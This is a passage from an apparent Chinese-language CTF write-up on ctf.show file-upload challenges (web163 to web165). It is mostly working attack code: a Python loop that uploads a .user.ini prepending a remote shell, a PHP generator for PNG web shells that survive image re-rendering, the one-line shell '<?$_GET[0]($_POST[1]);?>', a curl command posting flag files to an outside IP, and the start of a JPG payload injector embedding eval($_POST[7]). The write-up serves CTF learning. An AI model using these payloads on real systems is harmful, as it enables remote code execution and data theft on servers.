+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="n">burp0_url</span> <span class="o">=</span> <span class="s2">&#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/&#34;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="n">burp1_url</span> <span class="o">=</span> <span class="s2">&#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/upload/&#34;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Sec-Ch-Ua-Platform&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">Windows</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,zh;q=0.9&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Ch-Ua&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">Not?A_Brand</span><span class="se">\&#34;</span><span class="s2">;v=</span><span class="se">\&#34;</span><span class="s2">99</span><span class="se">\&#34;</span><span class="s2">, </span><span class="se">\&#34;</span><span class="s2">Chromium</span><span class="se">\&#34;</span><span class="s2">;v=</span><span class="se">\&#34;</span><span class="s2">130</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Ch-Ua-Mobile&#34;</span><span class="p">:</span> <span class="s2">&#34;?0&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json, text/javascript, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=----WebKitFormBoundaryBcDoqZWhQP52WEA6&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="s2">&#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Fetch-Site&#34;</span><span class="p">:</span> <span class="s2">&#34;same-origin&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Fetch-Mode&#34;</span><span class="p">:</span> <span class="s2">&#34;cors&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Fetch-Dest&#34;</span><span class="p">:</span> <span class="s2">&#34;empty&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show/&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate, br&#34;</span><span class="p">,</span> <span class="s2">&#34;Priority&#34;</span><span class="p">:</span> <span class="s2">&#34;u=1, i&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;keep-alive&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">burp0_data</span> <span class="o">=</span> <span class="s2">&#34;------WebKitFormBoundaryBcDoqZWhQP52WEA6</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">file</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">.user.ini</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/png</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a</span><span class="se">\r\n</span><span class="s2">auto_prepend_file=http://长整型ip:7777/shell</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundaryBcDoqZWhQP52WEA6--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">log</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">burp0_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">log1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp1_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">log</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">log1</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;ctfshow&#34;</span> <span class="ow">in</span> <span class="n">log1</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;getflag&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">break</span>
+</span></span></code></pre></div><p><img alt="image-20250127183202416" loading="lazy" src="../assets/image-20250127183202416.png"></p>
+<h4 id="web164">web164<a hidden class="anchor" aria-hidden="true" href="#web164">#</a></h4>
+<p><img alt="image-20250127194845782" loading="lazy" src="../assets/image-20250127194845782.png"></p>
+<p>这题随便传个图片试试发现多了个查看图片</p>
+<pre tabindex="0"><code>https://775e9cd3-3a73-47a1-b31d-7b4450ec5573.challenge.ctf.show/download.php?image=94f7678cc4cda39c02c7890bc8fe6941.png
+</code></pre><p><img alt="image-20250127194925361" loading="lazy" src="../assets/image-20250127194925361.png"></p>
+<p>从url我们可以看出这题存在图片包含</p>
+<p>我们可以利用这个文件包含去执行我们的图片马</p>
+<p>大佬的脚本，可以绕过二次渲染</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">           <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">           <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">           <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">           <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">           <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">           <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">           <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl">
+</span></span><span class="line"><span class="ln">12</span><span class="cl">
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nv">$img</span> <span class="o">=</span> <span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$y</span> <span class="o">&lt;</span> <span class="nx">sizeof</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span> <span class="nv">$y</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">   <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">   <span class="nv">$g</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">   <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">   <span class="nv">$color</span> <span class="o">=</span> <span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nv">$r</span><span class="p">,</span> <span class="nv">$g</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">   <span class="nx">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">
+</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="s1">&#39;./1.png&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><pre tabindex="0"><code>图片马的内容 &lt;?$_GET[0]($_POST[1]);?&gt;
+</code></pre><p>没有回显</p>
+<p>外带读flag</p>
+<pre tabindex="0"><code>POST 1=cat f* | curl -X POST -d @- http://106.55.168.231:7777/
+GET 0=system
+</code></pre><h4 id="web165">web165<a hidden class="anchor" aria-hidden="true" href="#web165">#</a></h4>
+<p>这题考察的也是图片马，但是是用jpg的图片马绕过二次渲染</p>
+<p>大佬的脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">  1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln">  2</span><span class="cl">    <span class="cm">/*
+</span></span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="cm">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
+</span></span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="cm">    It is necessary that the size and quality of the initial image are the same as those of the processed image.
+</span></span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="cm">    1) Upload an arbitrary image via secured files upload script
+</span></span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="cm">    2) Save the processed image and launch:
+</span></span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="cm">    jpg_payload.php &lt;jpg_name.jpg&gt;
+</span></span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="cm">    In case of successful injection you will get a specially crafted image, which should be uploaded again.
+</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="cm">    Since the most straightforward injection method is used, the following problems can occur:
+</span></span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="cm">    1) After the second processing the injected data may become partially corrupted.
+</span></span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="cm">    2) The jpg_payload.php script outputs &#34;Something&#39;s wrong&#34;.
+</span></span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="cm">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
+</span></span></span><span class="line"><span class="ln"> 17</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="cm">    Sergey Bobrov @Black2Fan.
+</span></span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="cm">    See also:
+</span></span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="cm">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+</span></span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="cm">    */</span>
+</span></span><span class="line"><span class="ln"> 24</span><span class="cl">		
+</span></span><span class="line"><span class="ln"> 25</span><span class="cl">    <span class="nv">$miniPayload</span> <span class="o">=</span> <span class="s2">&#34;&lt;?=eval(</span><span class="se">\$</span><span class="s2">_POST[7]);?&gt;&#34;</span><span class="p">;</span> <span class="c1">//注意$转义
+</span></span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="ln"> 27</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 28</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;gd&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;imagecreatefromjpeg&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 29</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php-gd is not installed&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 30</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 31</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 32</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 33</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 34</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 35</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 36</span><span class="cl">    <span class="nx">set_error_handler</span><span class="p">(</span><span class="s2">&#34;custom_error_handler&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 37</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 38</span><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$pad</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$pad</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">;</span> <span class="nv">$pad</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 39</span><span class="cl">        <span class="nv">$nullbytePayloadSize</span> <span class="o">=</span> <span class="nv">$pad</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 40</span><span class="cl">        <span class="nv">$dis</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataInputStream</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln"> 41</span><span class="cl">        <span class="nv">$outStream</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln"> 42</span><span class="cl">        <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 43</span><span class="cl">        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 44</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 45</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">!=</span> <span class="mh">0xFFD8</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 46</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Incorrect SOI marker&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 47</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 48</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 49</span><span class="cl">        <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">==</span> <span class="mh">0xFF</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 50</span><span class="cl">            <span class="nv">$marker</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 51</span><span class="cl">            <span class="nv">$size</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 52</span><span class="cl">            <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">skip</span><span class="p">(</span><span class="nv">$size</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 53</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$marker</span> <span class="o">===</span> <span class="mh">0xDA</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 54</span><span class="cl">                <span class="nv">$startPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 55</span><span class="cl">                <span class="nv">$outStreamTmp</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="ln"> 56</span><span class="cl">                    <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span> 
+</span></span><span class="line"><span class="ln"> 57</span><span class="cl">                    <span class="nv">$miniPayload</span> <span class="o">.</span> 
+</span></span><span class="line"><span class="ln"> 58</span><span class="cl">                    <span class="nx">str_repeat</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span> <span class="o">.</span> 
+</span></span><span class="line"><span class="ln"> 59</span><span class="cl">                    <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 60</span><span class="cl">                <span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStreamTmp</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 61</span><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nv">$extraBytes</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 62</span><span class="cl">                    <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">()))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 63</span><span class="cl">                        <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">===</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 64</span><span class="cl">                            <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span> <span class="o">!==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 65</span><span class="cl">                                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 66</span><span class="cl">                            <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 67</span><span class="cl">                        <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 68</span><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 69</span><span class="cl">                    <span class="nv">$stopPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 70</span><span class="cl">                    <span class="nv">$imageStreamSize</span> <span class="o">=</span> <span class="nv">$stopPos</span> <span class="o">-</span> <span class="nv">$startPos</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 71</span><span class="cl">                    <span class="nv">$outStream</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="ln"> 72</span><span class="cl">                        <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span> 
+</span></span><span class="line"><span class="ln"> 73</span><span class="cl">                        <span class="nv">$miniPayload</span> <span class="o">.</span> 
+</span></span><span class="line"><span class="ln"> 74</span><span class="cl">                        <span class="nx">substr</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln"> 75</span><span class="cl">                            <span class="nx">str_repeat</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="ln"> 76</span><span class="cl">                                <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">,</span> <span class="nv">$imageStreamSize</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln"> 77</span><span class="cl">                            <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 78</span><span class="cl">                            <span class="nv">$nullbytePayloadSize</span><span class="o">+</span><span class="nv">$imageStreamSize</span><span class="o">-</span><span class="nv">$extraBytes</span><span class="p">)</span> <span class="o">.</span> 
+</span></span><span class="line"><span class="ln"> 79</span><span class="cl">                                <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$stopPos</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 80</span><span class="cl">                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$correctImage</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 81</span><span class="cl">                    <span class="nv">$outStream</span> <span class="o">=</span> <span class="nv">$outStreamTmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 82</span><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 83</span><span class="cl">                    <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 84</span><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 85</span><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStream</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 86</span><span class="cl">                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Success!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 87</span><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 88</span><span class="cl">                    <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 89</span><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 90</span><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 91</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 92</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 93</span><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln"> 94</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Something\&#39;s wrong&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 95</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 96</span><span class="cl">    <span class="k">function</span> <span class="nf">checkImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$unlink</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 97</span><span class="cl">        <span class="k">global</span> <span class="nv">$correctImage</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 98</span><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 99</span><span class="cl">        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
